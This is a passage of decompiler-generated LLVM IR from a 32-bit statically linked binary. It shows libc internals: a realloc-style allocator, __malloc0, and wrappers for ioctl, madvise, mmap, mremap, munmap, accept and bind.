  br i1 %v6_804aeff, label %dec_label_pc_804af95, label %dec_label_pc_804af05

dec_label_pc_804af05:                             ; preds = %dec_label_pc_804aef7
  %v1_804af05 = add i32 %arg2, 23
  %v1_804af08 = and i32 %v1_804af05, -16
  store i32 %v1_804af08, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804af0f

dec_label_pc_804af0f:                             ; preds = %dec_label_pc_804af95, %dec_label_pc_804af05
  %stack_var_-20.0 = phi i32 [ 16, %dec_label_pc_804af95 ], [ %v1_804af08, %dec_label_pc_804af05 ]
  %v1_804af13 = add i32 %arg1, -8
  store i32 %v1_804af13, i32* @esi, align 4
  %v1_804af16 = add i32 %arg1, -4
  %v2_804af16 = inttoptr i32 %v1_804af16 to i32*
  %v3_804af16 = load i32, i32* %v2_804af16, align 4
  store i32 %v3_804af16, i32* %eax.global-to-local, align 4
  %v1_804af1b = and i32 %v3_804af16, -2
  store i32 %v1_804af1b, i32* @ebx, align 4
  %v2_804af1e = urem i32 %v3_804af16, 2
  %v3_804af1e = icmp eq i32 %v2_804af1e, 0
  %v1_804af20 = icmp eq i1 %v3_804af1e, false
  br i1 %v1_804af20, label %dec_label_pc_804afb4, label %dec_label_pc_804af26

dec_label_pc_804af26:                             ; preds = %dec_label_pc_804af0f
  store i32 %arg1, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-20.0, i32* %eax.global-to-local, align 4
  %v2_804af2e = inttoptr i32 %v1_804af13 to i32*
  %v3_804af2e = load i32, i32* %v2_804af2e, align 4
  store i32 %v3_804af2e, i32* @edi, align 4
  %v2_804af31 = add i32 %v3_804af2e, %stack_var_-20.0
  store i32 %v2_804af31, i32* %eax.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804af31, 4096
  br i1 %tmp, label %dec_label_pc_804b040, label %dec_label_pc_804af4e

dec_label_pc_804af4e:                             ; preds = %dec_label_pc_804b040.dec_label_pc_804af4e_crit_edge, %dec_label_pc_804af26
  %v1_804af69 = phi i32 [ %v1_804af4e.pre, %dec_label_pc_804b040.dec_label_pc_804af4e_crit_edge ], [ %v3_804af2e, %dec_label_pc_804af26 ]
  %v0_804af4e = phi i32 [ %v0_804af4e.pre, %dec_label_pc_804b040.dec_label_pc_804af4e_crit_edge ], [ %v1_804af1b, %dec_label_pc_804af26 ]
  %v2_804af4e = add i32 %v0_804af4e, %v1_804af69
  store i32 %v2_804af4e, i32* %ebp.global-to-local, align 4
  %v1_804af55 = add i32 %v2_804af31, 4095
  %v1_804af5b = and i32 %v1_804af55, -4096
  store i32 %v1_804af5b, i32* @ebx, align 4
  %v12_804af61 = icmp eq i32 %v2_804af4e, %v1_804af5b
  br i1 %v12_804af61, label %dec_label_pc_804b004, label %dec_label_pc_804af69

dec_label_pc_804af69:                             ; preds = %dec_label_pc_804af4e
  %v0_804af69 = load i32, i32* @esi, align 4
  %v2_804af69 = sub i32 %v0_804af69, %v1_804af69
  %v3_804af7e = call i32 @__mremap(i32 %v2_804af69, i32 %v1_804af5b, i32 1)
  store i32 %v3_804af7e, i32* %eax.global-to-local, align 4
  %v10_804af83 = icmp eq i32 %v3_804af7e, -1
  br i1 %v10_804af83, label %dec_label_pc_804aff8, label %dec_label_pc_804af88

dec_label_pc_804af88:                             ; preds = %dec_label_pc_804af69
  %v0_804af88 = load i32, i32* @edi, align 4
  %v2_804af88 = add i32 %v0_804af88, %v3_804af7e
  store i32 %v2_804af88, i32* %eax.global-to-local, align 4
  %v0_804af8b = load i32, i32* @ebx, align 4
  %v2_804af8b = sub i32 %v0_804af8b, %v0_804af88
  %v1_804af8d = add i32 %v2_804af88, 8
  store i32 %v1_804af8d, i32* @ebp, align 4
  %v2_804af90 = add i32 %v2_804af88, 4
  %v3_804af90 = inttoptr i32 %v2_804af90 to i32*
  store i32 %v2_804af8b, i32* %v3_804af90, align 4
  br label %dec_label_pc_804afe2

dec_label_pc_804af95:                             ; preds = %dec_label_pc_804aef7
  %v1_804af95 = icmp eq i32 %arg2, 0
  br i1 %v1_804af95, label %dec_label_pc_804af0f, label %dec_label_pc_804afa5

dec_label_pc_804afa5:                             ; preds = %dec_label_pc_804af95
  %v1_804afa5 = call i32 @__errno_location(i32 %arg1)
  store i32 %v1_804afa5, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebp, align 4
  %v1_804afac = inttoptr i32 %v1_804afa5 to i32*
  store i32 12, i32* %v1_804afac, align 4
  br label %dec_label_pc_804afe2

dec_label_pc_804afb4:                             ; preds = %dec_label_pc_804af0f
  %v2_804afb4 = add i32 %v1_804af1b, %v1_804af13
  store i32 %v2_804afb4, i32* @edi, align 4
  %v10_804afbc = icmp ult i32 %v1_804af1b, %stack_var_-20.0
  br i1 %v10_804afbc, label %dec_label_pc_804b010, label %dec_label_pc_804afc2

dec_label_pc_804afc2:                             ; preds = %dec_label_pc_804afb4
  %v1_804afc4 = or i32 %v3_804af16, 1
  store i32 %v1_804afc4, i32* %eax.global-to-local, align 4
  store i32 %v1_804afc4, i32* %v2_804af16, align 4
  %v0_804afca = load i32, i32* %eax.global-to-local, align 4
  %v1_804afca = load i32, i32* @edi, align 4
  %v2_804afca = inttoptr i32 %v1_804afca to i32*
  store i32 %v0_804afca, i32* %v2_804afca, align 4
  br label %dec_label_pc_804afcc

dec_label_pc_804afcc:                             ; preds = %dec_label_pc_804b01f, %dec_label_pc_804afc2
  %v0_804afcc = load i32, i32* @esi, align 4
  %v1_804afcc = add i32 %v0_804afcc, 4
  %v2_804afcc = inttoptr i32 %v1_804afcc to i32*
  %v3_804afcc = load i32, i32* %v2_804afcc, align 4
  %v1_804afcf = and i32 %v3_804afcc, -2
  store i32 %v1_804afcf, i32* @ebx, align 4
  %v1_804afd2 = add i32 %v1_804afcf, -16
  store i32 %v1_804afd2, i32* %eax.global-to-local, align 4
  %v6_804afd9 = icmp ugt i32 %v1_804afd2, %stack_var_-20.0
  br i1 %v6_804afd9, label %dec_label_pc_804b082, label %dec_label_pc_804afdf

dec_label_pc_804afdf:                             ; preds = %dec_label_pc_804afcc, %dec_label_pc_804b082
  %v0_804afdf = phi i32 [ %v0_804afcc, %dec_label_pc_804afcc ], [ %v0_804afdf.pre, %dec_label_pc_804b082 ]
  %v1_804afdf = add i32 %v0_804afdf, 8
  store i32 %v1_804afdf, i32* @ebp, align 4
  br label %dec_label_pc_804afe2

dec_label_pc_804afe2:                             ; preds = %dec_label_pc_804b0d8, %dec_label_pc_804b0f1, %dec_label_pc_804b056, %dec_label_pc_804b004, %dec_label_pc_804afa5, %dec_label_pc_804af88, %dec_label_pc_804afdf
  %v0_804afe2 = load i32, i32* @ebp, align 4
  store i32 %v0_804afe2, i32* %eax.global-to-local, align 4
  store i32 %v0_804aee9, i32* %ebp.global-to-local, align 4
  ret i32 %v0_804afe2

dec_label_pc_804aff8:                             ; preds = %dec_label_pc_804af69
  %v0_804aff8 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804aff8 = load i32, i32* @ebx, align 4
  %v6_804affa = icmp ugt i32 %v0_804aff8, %v1_804aff8
  %arg1. = select i1 %v6_804affa, i32 %arg1, i32 0
  br label %dec_label_pc_804b004

dec_label_pc_804b004:                             ; preds = %dec_label_pc_804aff8, %dec_label_pc_804af4e
  %stack_var_-28.0 = phi i32 [ %arg1, %dec_label_pc_804af4e ], [ %arg1., %dec_label_pc_804aff8 ]
  store i32 %stack_var_-28.0, i32* @ebp, align 4
  br label %dec_label_pc_804afe2

dec_label_pc_804b010:                             ; preds = %dec_label_pc_804afb4
  store i32 %v2_804afb4, i32* @eax, align 4
  %v0_804b012 = call i32 @alloc_fwd()
  store i32 %v0_804b012, i32* %eax.global-to-local, align 4
  %v1_804b017 = icmp eq i32 %v0_804b012, 0
  br i1 %v1_804b017, label %dec_label_pc_804b0ce, label %dec_label_pc_804b01f

dec_label_pc_804b01f:                             ; preds = %dec_label_pc_804b010
  %v0_804b01f = load i32, i32* @edi, align 4
  %v1_804b01f = add i32 %v0_804b01f, 4
  %v2_804b01f = inttoptr i32 %v1_804b01f to i32*
  %v3_804b01f = load i32, i32* %v2_804b01f, align 4
  %v1_804b022 = and i32 %v3_804b01f, -2
  store i32 %v1_804b022, i32* %eax.global-to-local, align 4
  %v1_804b025 = load i32, i32* @ebx, align 4
  %v2_804b025 = add i32 %v1_804b025, %v1_804b022
  store i32 %v2_804b025, i32* %ecx.global-to-local, align 4
  %v1_804b02a = or i32 %v2_804b025, 1
  store i32 %v1_804b02a, i32* %edx.global-to-local, align 4
  %v10_804b02d = icmp ult i32 %v2_804b025, %stack_var_-20.0
  %v1_804b031 = load i32, i32* @esi, align 4
  %v2_804b031 = add i32 %v1_804b031, 4
  %v3_804b031 = inttoptr i32 %v2_804b031 to i32*
  store i32 %v1_804b02a, i32* %v3_804b031, align 4
  %v0_804b034 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b034 = load i32, i32* @edi, align 4
  %v2_804b034 = load i32, i32* %eax.global-to-local, align 4
  %v3_804b034 = add i32 %v2_804b034, %v1_804b034
  %v4_804b034 = inttoptr i32 %v3_804b034 to i32*
  store i32 %v0_804b034, i32* %v4_804b034, align 4
  %v1_804b037 = icmp eq i1 %v10_804b02d, false
  br i1 %v1_804b037, label %dec_label_pc_804afcc, label %dec_label_pc_804b0d8

dec_label_pc_804b040:                             ; preds = %dec_label_pc_804af26
  store i32 %stack_var_-20.0, i32* %edx.global-to-local, align 4
  %v1_804b047 = call i32 @malloc(i32 %stack_var_-20.0)
  store i32 %v1_804b047, i32* %eax.global-to-local, align 4
  %v1_804b04c = icmp eq i32 %v1_804b047, 0
  store i32 %v1_804b047, i32* @ebp, align 4
  br i1 %v1_804b04c, label %dec_label_pc_804b040.dec_label_pc_804af4e_crit_edge, label %dec_label_pc_804b056

dec_label_pc_804b040.dec_label_pc_804af4e_crit_edge: ; preds = %dec_label_pc_804b040
  %v0_804af4e.pre = load i32, i32* @ebx, align 4
  %v1_804af4e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804af4e

dec_label_pc_804b056:                             ; preds = %dec_label_pc_804b040
  %v1_804b05d = add i32 %stack_var_-20.0, -8
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v3_804b06c = inttoptr i32 %arg1 to i8*
  %v4_804b06c = call i32 @memcpy(i8* %v3_804b06c, i32 %v1_804b05d, i32 %tmp5)
  store i32 %v4_804b06c, i32* @eax, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_804b078 = call i32 @free(i32 %arg1)
  store i32 %v1_804b078, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804afe2

dec_label_pc_804b082:                             ; preds = %dec_label_pc_804afcc
  %v2_804b086 = add i32 %v0_804afcc, %stack_var_-20.0
  store i32 %v2_804b086, i32* %eax.global-to-local, align 4
  %v1_804b08d = or i32 %stack_var_-20.0, 1
  store i32 %v1_804b08d, i32* %ecx.global-to-local, align 4
  %v5_804b090 = sub i32 %v1_804afcf, %stack_var_-20.0
  store i32 %v5_804b090, i32* %edx.global-to-local, align 4
  %v2_804b094 = inttoptr i32 %v2_804b086 to i32*
  store i32 %v1_804b08d, i32* %v2_804b094, align 4
  %v0_804b096 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b096 = or i32 %v0_804b096, 1
  store i32 %v1_804b096, i32* %edx.global-to-local, align 4
  %v1_804b099 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b099 = add i32 %v1_804b099, 4
  %v3_804b099 = inttoptr i32 %v2_804b099 to i32*
  store i32 %v1_804b096, i32* %v3_804b099, align 4
  %v0_804b09c = load i32, i32* %eax.global-to-local, align 4
  %v1_804b09c = add i32 %v0_804b09c, 8
  store i32 %v1_804b09c, i32* @eax, align 4
  %v0_804b09f = load i32, i32* %edx.global-to-local, align 4
  %v1_804b09f = load i32, i32* @esi, align 4
  %v2_804b09f = load i32, i32* @ebx, align 4
  %v3_804b09f = add i32 %v2_804b09f, %v1_804b09f
  %v4_804b09f = inttoptr i32 %v3_804b09f to i32*
  store i32 %v0_804b09f, i32* %v4_804b09f, align 4
  %v0_804b0a2 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804b0a2 = load i32, i32* @esi, align 4
  %v2_804b0a2 = add i32 %v1_804b0a2, 4
  %v3_804b0a2 = inttoptr i32 %v2_804b0a2 to i32*
  store i32 %v0_804b0a2, i32* %v3_804b0a2, align 4
  %v0_804b0a5 = load i32, i32* @eax, align 4
  %v1_804b0a8 = call i32 @free(i32 %v0_804b0a5)
  store i32 %v1_804b0a8, i32* %eax.global-to-local, align 4
  %v0_804afdf.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804afdf

dec_label_pc_804b0b2:                             ; preds = %entry
  %v1_804b0c9 = call i32 @malloc(i32 0)
  store i32 %v1_804b0c9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b0ce

dec_label_pc_804b0ce:                             ; preds = %dec_label_pc_804b010, %dec_label_pc_804b0b2
  %stack_var_-20.1 = phi i32 [ %tmp7, %dec_label_pc_804b0b2 ], [ %stack_var_-20.0, %dec_label_pc_804b010 ]
  %v0_804b0ce = load i32, i32* @ebx, align 4
  %v1_804b0d0 = or i32 %v0_804b0ce, 1
  store i32 %v1_804b0d0, i32* %eax.global-to-local, align 4
  %v1_804b0d3 = load i32, i32* @esi, align 4
  %v2_804b0d3 = add i32 %v1_804b0d3, 4
  %v3_804b0d3 = inttoptr i32 %v2_804b0d3 to i32*
  store i32 %v1_804b0d0, i32* %v3_804b0d3, align 4
  %v0_804b0d6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b0d6 = load i32, i32* @edi, align 4
  %v2_804b0d6 = inttoptr i32 %v1_804b0d6 to i32*
  store i32 %v0_804b0d6, i32* %v2_804b0d6, align 4
  br label %dec_label_pc_804b0d8

dec_label_pc_804b0d8:                             ; preds = %dec_label_pc_804b01f, %dec_label_pc_804b0ce
  %stack_var_-20.2 = phi i32 [ %stack_var_-20.1, %dec_label_pc_804b0ce ], [ %stack_var_-20.0, %dec_label_pc_804b01f ]
  %v1_804b0dc = add i32 %stack_var_-20.2, -8
  store i32 %v1_804b0dc, i32* %eax.global-to-local, align 4
  %v1_804b0e2 = call i32 @malloc(i32 %v1_804b0dc)
  store i32 %v1_804b0e2, i32* %eax.global-to-local, align 4
  %v1_804b0e7 = icmp eq i32 %v1_804b0e2, 0
  store i32 %v1_804b0e2, i32* @ebp, align 4
  br i1 %v1_804b0e7, label %dec_label_pc_804afe2, label %dec_label_pc_804b0f1

dec_label_pc_804b0f1:                             ; preds = %dec_label_pc_804b0d8
  %v0_804b0f1 = load i32, i32* @ebx, align 4
  %v1_804b0f1 = add i32 %v0_804b0f1, -8
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v3_804b103 = inttoptr i32 %arg1 to i8*
  %v4_804b103 = call i32 @memcpy(i8* %v3_804b103, i32 %v1_804b0f1, i32 %tmp5)
  %v0_804b108 = load i32, i32* @esi, align 4
  %v1_804b108 = add i32 %v0_804b108, 8
  store i32 %v1_804b108, i32* @eax, align 4
  %v1_804b10e = call i32 @free(i32 %v1_804b108)
  store i32 %v1_804b10e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804afe2

; uselistorder directives
  uselistorder i32 %v2_804af88, { 1, 0, 2 }
  uselistorder i32 %v0_804af88, { 1, 0 }
  uselistorder i32 %v3_804af7e, { 1, 0, 2 }
  uselistorder i32 %v1_804af5b, { 1, 0, 2 }
  uselistorder i32 %v1_804af69, { 1, 0 }
  uselistorder i32 %v2_804af31, { 1, 0, 2 }
  uselistorder i32 %v3_804af2e, { 1, 0, 2 }
  uselistorder i32 %v1_804af1b, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804af16, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-20.0, { 6, 11, 7, 8, 0, 2, 4, 3, 10, 9, 12, 1, 5 }
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 4, 3, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28 }
  uselistorder i32 ()* @alloc_fwd, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 11, 10, 4, 5, 3, 2, 6, 0, 1, 7, 9, 8, 13, 12 }
  uselistorder label %dec_label_pc_804b0d8, { 1, 0 }
  uselistorder label %dec_label_pc_804b0ce, { 1, 0 }
  uselistorder label %dec_label_pc_804afe2, { 1, 0, 2, 3, 6, 4, 5 }
  uselistorder label %dec_label_pc_804afdf, { 1, 0 }
}

define i32 @__malloc0(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804b12b = call i32 @malloc(i32 %arg1)
  %v1_804b130 = icmp eq i32 %v1_804b12b, 0
  br i1 %v1_804b130, label %dec_label_pc_804b15c, label %dec_label_pc_804b134

dec_label_pc_804b134:                             ; preds = %entry
  %v1_804b134 = add i32 %v1_804b12b, -4
  %v2_804b134 = inttoptr i32 %v1_804b134 to i8*
  %v3_804b134 = load i8, i8* %v2_804b134, align 1
  %v4_804b134 = urem i8 %v3_804b134, 2
  %v5_804b134 = icmp eq i8 %v4_804b134, 0
  br i1 %v5_804b134, label %dec_label_pc_804b15c, label %dec_label_pc_804b13a

dec_label_pc_804b13a:                             ; preds = %dec_label_pc_804b134
  %v0_804b13a = load i32, i32* @ebx, align 4
  %v1_804b13a = add i32 %v0_804b13a, 3
  %v2_804b13d = udiv i32 %v1_804b13a, 4
  %tmp = icmp ult i32 %v1_804b13a, 4
  store i32 %v2_804b13d, i32* %ecx.global-to-local, align 4
  br i1 %tmp, label %dec_label_pc_804b15c, label %dec_label_pc_804b14b

dec_label_pc_804b148:                             ; preds = %dec_label_pc_804b157
  %v0_804b148 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b148 = add i32 %v0_804b148, 4
  br label %dec_label_pc_804b14b

dec_label_pc_804b14b:                             ; preds = %dec_label_pc_804b13a, %dec_label_pc_804b148
  %v0_804b1571 = phi i32 [ %v1_804b157, %dec_label_pc_804b148 ], [ %v2_804b13d, %dec_label_pc_804b13a ]
  %v0_804b151 = phi i32 [ %v1_804b148, %dec_label_pc_804b148 ], [ %v1_804b12b, %dec_label_pc_804b13a ]
  store i32 %v0_804b151, i32* %edx.global-to-local, align 4
  %v1_804b14b = inttoptr i32 %v0_804b151 to i32*
  %v2_804b14b = load i32, i32* %v1_804b14b, align 4
  %v1_804b14d = icmp eq i32 %v2_804b14b, 0
  br i1 %v1_804b14d, label %dec_label_pc_804b157, label %dec_label_pc_804b151

dec_label_pc_804b151:                             ; preds = %dec_label_pc_804b14b
  store i32 0, i32* %v1_804b14b, align 4
  %v0_804b157.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804b157

dec_label_pc_804b157:                             ; preds = %dec_label_pc_804b14b, %dec_label_pc_804b151
  %v0_804b157 = phi i32 [ %v0_804b1571, %dec_label_pc_804b14b ], [ %v0_804b157.pre, %dec_label_pc_804b151 ]
  %v1_804b157 = add i32 %v0_804b157, -1
  %v9_804b157 = icmp eq i32 %v1_804b157, 0
  store i32 %v1_804b157, i32* %ecx.global-to-local, align 4
  %v1_804b15a = icmp eq i1 %v9_804b157, false
  br i1 %v1_804b15a, label %dec_label_pc_804b148, label %dec_label_pc_804b15c.loopexit

dec_label_pc_804b15c.loopexit:                    ; preds = %dec_label_pc_804b157
  br label %dec_label_pc_804b15c

dec_label_pc_804b15c:                             ; preds = %dec_label_pc_804b15c.loopexit, %dec_label_pc_804b13a, %dec_label_pc_804b134, %entry
  ret i32 %v1_804b12b

; uselistorder directives
  uselistorder i32 %v1_804b157, { 2, 1, 0 }
  uselistorder i32 %v2_804b13d, { 1, 0 }
  uselistorder i32 %v1_804b12b, { 2, 0, 1, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b157, { 1, 0 }
  uselistorder label %dec_label_pc_804b14b, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b164 = load i32, i32* @edi, align 4
  store i32 %v0_804b164, i32* %stack_var_-4, align 4
  %v2_804b168 = ptrtoint i32* %stack_var_16 to i32
  store i32 %arg1, i32* @edx, align 4
  store i32 54, i32* @eax, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_804b181 = call i32 @__vsyscall(i32 %v2_804b168)
  %v1_804b18a = call i32 @__syscall_ret(i32 %v1_804b181)
  %v2_804b192 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b192, i32* @edi, align 4
  ret i32 %v1_804b18a
}

define i32 @__madvise(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_804b194 = load i32, i32* @edi, align 4
  store i32 219, i32* @eax, align 4
  store i32 %arg1, i32* @edx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_804b1a6 = call i32 @__vsyscall(i32 %v0_804b194)
  %v1_804b1b0 = call i32 @__syscall_ret(i32 %v1_804b1a6)
  ret i32 %v1_804b1b0
}

define i32 @dummy.2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804b1b8 = load i32, i32* @eax, align 4
  ret i32 %v0_804b1b8
}

define i32 @__mmap(i32 %arg1, i32 %arg2, i32 %arg3, i8 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %of.global-to-local = alloca i1, align 1
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_804b1b9 = load i32, i32* @ebp, align 4
  %v0_804b1bb = load i32, i32* @esi, align 4
  %v0_804b1bc = load i32, i32* @ebx, align 4
  %v15_804b1bd = ptrtoint i32* %stack_var_-44 to i32
  store i32 %arg3, i32* @edi, align 4
  %v1_804b1ce = and i32 %arg7, -4096
  store i32 %v1_804b1ce, i32* @edx, align 4
  %v1_804b1d6 = urem i32 %arg6, 4096
  store i32 %v1_804b1d6, i32* @eax, align 4
  %v2_804b1dd = or i32 %v1_804b1ce, %v1_804b1d6
  store i1 false, i1* %of.global-to-local, align 1
  %v3_804b1dd = icmp eq i32 %v2_804b1dd, 0
  store i32 %v2_804b1dd, i32* @ecx, align 4
  br i1 %v3_804b1dd, label %dec_label_pc_804b1ee, label %dec_label_pc_804b1e1

dec_label_pc_804b1e1:                             ; preds = %entry
  %v1_804b1e1 = call i32 @__errno_location(i32 %v0_804b1bc)
  %v1_804b1e6 = inttoptr i32 %v1_804b1e1 to i32*
  store i32 22, i32* %v1_804b1e6, align 4
  br label %dec_label_pc_804b203

dec_label_pc_804b1ee:                             ; preds = %entry
  %v9_804b1ee = sub i32 2147483645, %arg2
  %v10_804b1ee = and i32 %v9_804b1ee, %arg2
  %v11_804b1ee = icmp slt i32 %v10_804b1ee, 0
  store i1 %v11_804b1ee, i1* %of.global-to-local, align 1
  %tmp = icmp ult i32 %arg2, 2147483647
  br i1 %tmp, label %dec_label_pc_804b208, label %dec_label_pc_804b1f8

dec_label_pc_804b1f8:                             ; preds = %dec_label_pc_804b1ee
  %v1_804b1f8 = call i32 @__errno_location(i32 %v0_804b1bc)
  %v1_804b1fd = inttoptr i32 %v1_804b1f8 to i32*
  store i32 12, i32* %v1_804b1fd, align 4
  br label %dec_label_pc_804b203

dec_label_pc_804b203:                             ; preds = %dec_label_pc_804b1e1, %dec_label_pc_804b1f8
  store i1 false, i1* %of.global-to-local, align 1
  %v0_804b253.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804b253

dec_label_pc_804b208:                             ; preds = %dec_label_pc_804b1ee
  %v4_804b208 = and i8 %arg4, 16
  store i1 false, i1* %of.global-to-local, align 1
  %v5_804b208 = icmp eq i8 %v4_804b208, 0
  br i1 %v5_804b208, label %dec_label_pc_804b214, label %dec_label_pc_804b20f

dec_label_pc_804b20f:                             ; preds = %dec_label_pc_804b208
  %v2_804b20f = call i32 @dummy.2(i32 %v0_804b1bc, i32 %v0_804b1bb)
  %v2_804b218.pre = load i1, i1* %of.global-to-local, align 1
  br label %dec_label_pc_804b214

dec_label_pc_804b214:                             ; preds = %dec_label_pc_804b208, %dec_label_pc_804b20f
  %v2_804b218 = phi i1 [ false, %dec_label_pc_804b208 ], [ %v2_804b218.pre, %dec_label_pc_804b20f ]
  store i32 192, i32* @ebx, align 4
  store i32 %arg1, i32* @edx, align 4
  store i1 %v2_804b218, i1* %of.global-to-local, align 1
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg5, i32* %stack_var_-24, align 4
  store i32 192, i32* @eax, align 4
  %v2_804b23f = call i32 @__vsyscall6(i32* nonnull %stack_var_-24)
  %v6_804b247 = sub i32 11, %v15_804b1bd
  %v7_804b247 = and i32 %v6_804b247, %v15_804b1bd
  %v8_804b247 = icmp slt i32 %v7_804b247, 0
  store i1 %v8_804b247, i1* %of.global-to-local, align 1
  %v1_804b24b = call i32 @__syscall_ret(i32 %v2_804b23f)
  %v0_804b250 = load i32, i32* @esp, align 4
  %v1_804b250 = add i32 %v0_804b250, 16
  %v3_804b250 = xor i32 %v0_804b250, -2147483648
  %v4_804b250 = and i32 %v1_804b250, %v3_804b250
  %v5_804b250 = icmp slt i32 %v4_804b250, 0
  store i1 %v5_804b250, i1* %of.global-to-local, align 1
  br label %dec_label_pc_804b253

dec_label_pc_804b253:                             ; preds = %dec_label_pc_804b203, %dec_label_pc_804b214
  %v0_804b25a = phi i32 [ -1, %dec_label_pc_804b203 ], [ %v1_804b24b, %dec_label_pc_804b214 ]
  %v0_804b253 = phi i32 [ %v0_804b253.pre, %dec_label_pc_804b203 ], [ %v15_804b1bd, %dec_label_pc_804b214 ]
  %v1_804b253 = add i32 %v0_804b253, 28
  %v6_804b253 = xor i32 %v0_804b253, -2147483648
  %v7_804b253 = and i32 %v1_804b253, %v6_804b253
  %v8_804b253 = icmp slt i32 %v7_804b253, 0
  store i1 %v8_804b253, i1* %of.global-to-local, align 1
  store i32 %v0_804b1bc, i32* @ebx, align 4
  store i32 %v0_804b1bb, i32* @esi, align 4
  store i32 %v0_804b1b9, i32* @ebp, align 4
  ret i32 %v0_804b25a

; uselistorder directives
  uselistorder i32 %v0_804b253, { 1, 0 }
  uselistorder i32 %v1_804b1d6, { 1, 0 }
  uselistorder i32 %v15_804b1bd, { 1, 0, 2 }
  uselistorder i32 %arg2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804b253, { 1, 0 }
  uselistorder label %dec_label_pc_804b214, { 1, 0 }
  uselistorder label %dec_label_pc_804b203, { 1, 0 }
}

define i32 @__mremap(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_804b25c = load i32, i32* @edi, align 4
  %v0_804b25e = load i32, i32* @ebx, align 4
  store i32 %v0_804b25e, i32* %stack_var_-12, align 4
  store i32 %arg3, i32* @edi, align 4
  store i32 163, i32* @eax, align 4
  store i32 %tmp1, i32* @ebx, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_804b284 = call i32 @__vsyscall(i32 %tmp1)
  %v1_804b290 = call i32 @__syscall_ret(i32 %v1_804b284)
  %v2_804b298 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804b298, i32* @ebx, align 4
  store i32 %v0_804b25c, i32* @edi, align 4
  ret i32 %v1_804b290

; uselistorder directives
  uselistorder i32 %tmp1, { 1, 0 }
}

define i32 @dummy.3() local_unnamed_addr {
entry:
  %v0_804b29c = load i32, i32* @eax, align 4
  ret i32 %v0_804b29c
}

define i32 @__munmap(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804b29d = load i32, i32* @esi, align 4
  %v0_804b29e = load i32, i32* @ebx, align 4
  store i32 %v0_804b29e, i32* %stack_var_-8, align 4
  %v2_804b2aa = call i32 @dummy.2(i32 %v0_804b29e, i32 %v0_804b29d)
  store i32 91, i32* @eax, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_804b2b6 = load i32, i32* @ebx, align 4
  store i32 %v0_804b2b6, i32* @ecx, align 4
  %v0_804b2b8 = load i32, i32* %stack_var_-8, align 4
  %v1_804b2b8 = call i32 @__vsyscall(i32 %v0_804b2b8)
  store i32 %v0_804b2b8, i32* @ebx, align 4
  %v1_804b2c4 = call i32 @__syscall_ret(i32 %v1_804b2b8)
  ret i32 %v1_804b2c4
}

define i32 @accept(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804b2ff = ptrtoint i32* %stack_var_-24 to i32
  %v7_804b311 = call i32 @__syscall_cp(i32 102, i32 5, i32 %v2_804b2ff, i32 0, i32 0, i32 0, i32 0)
  %v1_804b31a = call i32 @__syscall_ret(i32 %v7_804b311)
  ret i32 %v1_804b31a

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 2, i32* @edx, align 4
  %v2_804b330 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804b330, i32* @ecx, align 4
